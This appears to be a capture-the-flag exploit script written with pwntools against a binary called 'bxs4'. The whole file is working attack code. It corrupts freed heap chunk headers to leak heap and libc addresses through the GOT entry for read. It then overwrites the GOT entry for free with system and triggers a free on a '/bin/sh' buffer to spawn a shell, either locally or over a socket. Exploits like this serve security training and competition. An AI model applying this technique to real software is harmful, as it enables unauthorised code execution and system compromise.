from pwn import *

LOCAL = True
elf = ELF("./bxs4")

if LOCAL:
    #context.log_level = 'debug'
    read_off = 0xF6670
    system_off = 0x45390
else:
    read_off = 0xF6670
    system_off = 0x45390

def m_allloc(io, length, mcontent):
    io.recvuntil("23333:")
    io.sendline(str(1))
    io.recvuntil("Init the world size:")
    io.sendline(str(length))
    io.recvuntil("Excalibur!")
    io.send(mcontent)

def m_lookup(io, mid):
    io.recvuntil("23333:")
    io.sendline(str(2))
    io.recvuntil("which one would you like to check")
    io.sendline(str(mid))
    io.recvuntil("ka kunin ofu lixi masi\n")

def m_destroy(io, mid):
    io.recvuntil("23333:")
    io.sendline(str(3))
    io.recvuntil("Input id:")
    io.sendline(str(mid))

def m_build(io, mid, length, mcontent):
    io.recvuntil("23333:")
    io.sendline(str(4))
    io.recvuntil("Input id:")
    io.sendline(str(mid))
    io.recvuntil("Umm.. How much are .. you")
    io.sendline(str(length))
    io.recvuntil("What are you going")
    io.send(mcontent)

def m_leak(io):
    m_allloc(io, 0x60, 'a'*0x60)
    m_allloc(io, 0x10, 'b'*0x10)
    m_allloc(io, 0x10, 'c'*0x10)
    m_allloc(io, 0x10, 'd'*0x10)
    m_allloc(io, 0x10, 'e'*0x10)
    m_destroy(io, 2)
    m_destroy(io, 1)
    raw_input("what")
    payload = '0'*0x60 + p64(0) + p64(0x21) + chr(0x70)
    m_build(io, 0, len(payload), payload)
    m_allloc(io, 0x10, 'c'*0x10)
    m_allloc(io, 0x10, 'd'*0x10)
    m_destroy(io, 1)
    m_destroy(io, 2)
    m_lookup(io, 4)
    data = io.recv(8)
    heap_poin0_addr = u64(data) - 0x1B0
    log.info("heap porinter 0 address: " + hex(heap_poin0_addr))
    # real leak
    payload = '0'*0x10 + p64(0) + p64(0x21) + p64(heap_poin0_addr)
    m_build(io, 3, len(payload), payload)
    m_allloc(io, 0x10, 'c'*0x10)    # 1
    m_allloc(io, 0x10, 'd'*0x10)    # 2
    payload = p64(0x0000006000000001) + p64(elf.got['read'])
    m_build(io, 2, len(payload), payload)
    m_lookup(io, 0)
    libc_addr = u64(io.recv(8)) - read_off
    log.info("libc address: " + hex(libc_addr))
    return libc_addr

def m_exploit(io):
    lk_addr = m_leak(io)
    system_addr = lk_addr + system_off
    log.info("system address: " + hex(system_addr))
    payload = p64(0x0000006000000001) + p64(elf.got['free'])
    m_build(io, 2, len(payload), payload)
    payload = p64(system_addr)
    m_build(io, 0, len(payload), payload)
    payload = "/bin/sh\x00"
    m_build(io, 3, len(payload), payload)
    m_destroy(io, 3)
    io.interactive()

if __name__ == '__main__':
    if LOCAL:
        io = process('./bxs4')
    else:
        io = remote('127.0.0.1', 54321)
    m_exploit(io)
    raw_input("over?")
    io.close()

